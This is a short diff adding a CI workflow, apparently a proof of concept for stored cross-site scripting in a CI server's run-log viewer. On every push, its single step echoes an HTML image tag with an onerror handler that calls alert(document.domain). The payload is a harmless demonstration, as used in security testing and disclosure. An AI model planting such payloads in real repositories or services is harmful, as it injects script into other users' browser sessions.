@@ -1,0 +1,14 @@
+kind: workflow
+name: XSS Stored on runs log
+on:
+  push:
+    branches:
+      - '**'
+jobs:
+  build:
+    steps:
+      - name: SimpleXSS Stored on runs log
+        uses: docker://debian
+        shell: sh
+        run: |
+          echo '<img src="qq" onerror="alert(document.domain)">'
